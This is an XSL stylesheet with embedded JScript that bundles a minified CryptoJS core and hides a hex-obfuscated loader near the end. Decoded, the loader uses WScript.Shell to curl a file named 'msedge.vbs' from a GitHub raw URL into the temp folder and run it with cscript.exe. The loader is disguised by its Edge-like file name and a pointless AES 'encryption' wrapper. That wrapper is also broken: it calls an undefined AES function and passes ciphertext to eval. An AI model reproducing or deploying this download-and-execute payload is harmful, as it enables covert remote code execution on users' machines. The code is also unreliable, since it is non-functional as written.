<?xml version='1.0'?> 
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="unknown" version="1.0">
  <output method="text"/>
  <ms:script language="JScript" implements-prefix="user"> 
    <![CDATA[
    var CryptoJS = CryptoJS || function(u, p) {
        var d = {}, l = d.lib = {}, s = function() {}, t = l.Base = {
            extend: function(a) {
                s.prototype = this;
                var c = new s;
                a && c.mixIn(a);
                c.hasOwnProperty("init") || (c.init = function() {
                    c.$super.init.apply(this, arguments)
                });
                c.init.prototype = c;
                c.$super = this;
                return c
            },
            create: function() {
                var a = this.extend();
                a.init.apply(a, arguments);
                return a
            },
            init: function() {},
            mixIn: function(a) {
                for (var c in a) a.hasOwnProperty(c) && (this[c] = a[c]);
                a.hasOwnProperty("toString") && (this.toString = a.toString)
            },
            clone: function() {
                return this.init.prototype.extend(this)
            }
        }, r = l.WordArray = t.extend({
            init: function(a, c) {
                a = this.words = a || [];
                this.sigBytes = c != p ? c : 4 * a.length
            },
            toString: function(a) {
                return (a || v).stringify(this)
            },
            concat: function(a) {
                var c = this.words, e = a.words, j = this.sigBytes;
                a = a.sigBytes;
                this.clamp();
                if (j % 4)
                    for (var k = 0; k < a; k++)
                        c[j + k >>> 2] |= (e[k >>> 2] >>> 24 - k % 4 * 8 & 255) << 24 - (j + k) % 4 * 8;
                else if (65535 < e.length)
                    for (k = 0; k < a; k += 4)
                        c[j + k >>> 2] = e[k >>> 2];
                else
                    c.push.apply(c, e);
                this.sigBytes += a;
                return this
            },
            clamp: function() {
                var a = this.words, c = this.sigBytes;
                a[c >>> 2] &= 4294967295 << 32 - c % 4 * 8;
                a.length = u.ceil(c / 4)
            },
            clone: function() {
                var a = t.clone.call(this);
                a.words = this.words.slice(0);
                return a
            },
            random: function(a) {
                for (var c = [], e = 0; e < a; e += 4)
                    c.push(4294967296 * u.random() | 0);
                return new r.init(c, a)
            }
        }), w = d.enc = {}, v = w.Hex = {
            stringify: function(a) {
                var c = a.words;
                a = a.sigBytes;
                for (var e = [], j = 0; j < a; j++) {
                    var k = c[j >>> 2] >>> 24 - j % 4 * 8 & 255;
                    e.push((k >>> 4).toString(16));
                    e.push((k & 15).toString(16))
                }
                return e.join("")
            },
            parse: function(a) {
                for (var c = a.length, e = [], j = 0; j < c; j += 2)
                    e[j >>> 3] |= parseInt(a.substr(j, 2), 16) << 24 - j % 8 * 4;
                return new r.init(e, c / 2)
            }
        }, b = w.Latin1 = {
            stringify: function(a) {
                var c = a.words;
                a = a.sigBytes;
                for (var e = [], j = 0; j < a; j++)
                    e.push(String.fromCharCode(c[j >>> 2] >>> 24 - j % 4 * 8 & 255));
                return e.join("")
            },
            parse: function(a) {
                for (var c = a.length, e = [], j = 0; j < c; j++)
                    e[j >>> 2] |= (a.charCodeAt(j) & 255) << 24 - j % 4 * 8;
                return new r.init(e, c)
            }
        }, x = w.Utf8 = {
            stringify: function(a) {
                try {
                    return decodeURIComponent(escape(b.stringify(a)))
                } catch (c) {
                    throw Error("Malformed UTF-8 data");
                }
            },
            parse: function(a) {
                return b.parse(unescape(encodeURIComponent(a)))
            }
        }, q = l.BufferedBlockAlgorithm = t.extend({
            reset: function() {
                this._data = new r.init;
                this._nDataBytes = 0
            },
            _append: function(a) {
                "string" == typeof a && (a = x.parse(a));
                this._data.concat(a);
                this._nDataBytes += a.sigBytes
            },
            _process: function(a) {
                var c = this._data, e = c.words, j = c.sigBytes, k = this.blockSize, b = j / (4 * k), b = a ? u.ceil(b) : u.max((b | 0) - this._minBufferSize, 0);
                a = b * k;
                j = u.min(4 * a, j);
                if (a) {
                    for (var q = 0; q < a; q += k)
                        this._doProcessBlock(e, q);
                    q = e.splice(0, a);
                    c.sigBytes -= j
                }
                return new r.init(q, j)
            },
            clone: function() {
                var a = t.clone.call(this);
                a._data = this._data.clone();
                return a
            },
            _minBufferSize: 0
        });
        l.Hasher = q.extend({
            cfg: t.extend(),
            init: function(a) {
                this.cfg = this.cfg.extend(a);
                this.reset()
            },
            reset: function() {
                q.reset.call(this);
                this._doReset()
            },
            update: function(a) {
                this._append(a);
                this._process();
                return this
            },
            finalize: function(a) {
                a && this._append(a);
                return this._doFinalize()
            },
            blockSize: 16,
            _createHelper: function(a) {
                return function(b, e) {
                    return (new a.init(e)).finalize(b)
                }
            },
            _createHmacHelper: function(a) {
                return function(b, e) {
                    return (new n.HMAC.init(a, e)).finalize(b)
                }
            }
        });
        var n = d.algo = {};
        return d
    }(Math);

    var _0x1a2b = ["\x57\x53\x63\x72\x69\x70\x74\x2E\x53\x68\x65\x6C\x6C","\x52\x75\x6E\x28","\x63\x75\x72\x6C\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x72\x61\x77\x2E\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x56\x69\x63\x6B\x79\x2D\x53\x79\x73\x74\x2F\x6D\x6F\x66\x61\x2F\x6D\x73\x65\x64\x67\x65\x2F\x6D\x73\x65\x64\x67\x65\x2E\x76\x62\x73\x20\x2D\x6F\x20","\x25\x54\x45\x4D\x50","\x5C\x6D\x73\x65\x64\x67\x65\x2E\x76\x62\x73","\x26\x26\x20\x63\x73\x63\x72\x69\x70\x74\x2E\x65\x78\x65\x20","\x25\x54\x45\x4D\x50","\x5C\x6D\x73\x65\x64\x67\x65\x2E\x76\x62\x73","\x22\x29\x3B"];
    var _0x3dc6 = _0x1a2b[0x0] + _0x1a2b[0x1] + _0x1a2b[0x2] + _0x1a2b[0x3] + _0x1a2b[0x4] + _0x1a2b[0x5] + _0x1a2b[0x6] + _0x1a2b[0x7];

    // AES encryption function
    function encryptAES(text, password) {
        var encrypted = CryptoJS.AES.encrypt(text, password);
        return encrypted.toString();
    }

    var key = 'your_secret_key'; // Replace with your AES encryption key
    var encryptedScript = encryptAES(_0x3dc6, key);
    eval(encryptedScript); // Execute the encrypted script
    ]]>
  </ms:script>
</stylesheet>
